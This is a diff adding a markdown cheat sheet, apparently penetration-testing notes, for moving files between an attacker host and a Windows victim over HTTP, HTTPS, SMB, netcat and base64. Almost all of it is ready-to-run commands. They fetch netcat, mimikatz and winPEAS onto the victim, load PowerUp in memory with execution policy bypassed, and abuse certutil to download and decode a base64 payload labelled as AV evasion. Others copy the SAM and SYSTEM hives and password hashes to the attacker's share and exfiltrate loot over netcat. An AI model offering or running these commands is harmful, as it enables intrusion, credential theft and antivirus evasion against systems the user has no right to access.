@@ -1,0 +1,157 @@
+---
+title: "Transfer"
+---
+
+# TCP 80 — HTTP
+
+## Python Web Server (Attacker)
+
+```bash
+python3 -m http.server 80
+```
+
+---
+
+## PowerShell (Invoke-WebRequest)
+
+```powershell
+powershell -c "iwr http://10.10.10.10/nc.exe -OutFile C:\Windows\Temp\nc.exe"
+powershell -c "iwr http://10.10.10.10/mimikatz.exe -OutFile mimikatz.exe"
+powershell -c "iwr http://10.10.10.10/winPEAS.exe -OutFile winPEAS.exe"
+```
+
+Execute in memory:
+
+```powershell
+powershell -ep bypass -c "iex(iwr http://10.10.10.10/powerup.ps1 -UseBasicParsing)"
+```
+
+---
+
+## PowerShell WebClient (Stealthier)
+
+```powershell
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/nc.exe','nc.exe')"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/mimikatz.exe','mimikatz.exe')"
+```
+
+---
+
+## Certutil (CMD LOLBIN)
+
+```shellscript
+certutil -urlcache -split -f http://10.10.10.10/nc.exe nc.exe
+certutil -urlcache -split -f http://10.10.10.10/mimikatz.exe mimikatz.exe
+certutil -urlcache -split -f http://10.10.10.10/winPEAS.exe winPEAS.exe
+```
+
+---
+
+# TCP 139 / 445 — SMB
+
+## Attacker
+
+```bash
+impacket-smbserver share . -smb2support
+```
+
+---
+
+## Victim Download
+
+```cmd
+copy \\10.10.10.10\share\nc.exe nc.exe
+copy \\10.10.10.10\share\mimikatz.exe mimikatz.exe
+copy \\10.10.10.10\share\winPEAS.exe winPEAS.exe
+```
+
+PowerShell:
+
+```powershell
+New-PSDrive -Name p -PSProvider FileSystem -Root \\10.10.10.10\share
+copy p:\nc.exe .
+copy p:\mimikatz.exe .
+```
+
+---
+
+## Upload Loot
+
+```cmd
+copy SAM \\10.10.10.10\share\
+copy SYSTEM \\10.10.10.10\share\
+copy hashes.txt \\10.10.10.10\share\
+```
+
+---
+
+# TCP 443 — HTTPS (Often Allowed Egress)
+
+## Attacker
+
+```bash
+python3 -m http.server 443
+```
+
+## Victim
+
+```powershell
+powershell -c "iwr https://10.10.10.10/nc.exe -OutFile nc.exe"
+```
+
+---
+
+# TCP 4444 — Netcat Raw Transfer
+
+## Upload TO victim (push)
+
+Attacker:
+
+```bash
+nc -lvnp 4444 < mimikatz.exe
+```
+
+Victim:
+
+```cmd
+nc 10.10.10.10 4444 > mimikatz.exe
+```
+
+---
+
+## Download FROM victim (exfil)
+
+Attacker:
+
+```bash
+nc -lvnp 4444 > loot.zip
+```
+
+Victim:
+
+```cmd
+nc 10.10.10.10 4444 < C:\Users\Public\loot.zip
+```
+
+---
+
+# TCP ANY — Base64 Transfer (AV Evasion / Restricted Shell)
+
+## Attacker
+
+```bash
+base64 mimikatz.exe > mimikatz.b64
+```
+
+Serve:
+
+```bash
+python3 -m http.server 80
+```
+
+## Victim
+
+```cmd
+certutil -urlcache -f http://10.10.10.10/mimikatz.b64 mimikatz.b64
+certutil -decode mimikatz.b64 mimikatz.exe
+```
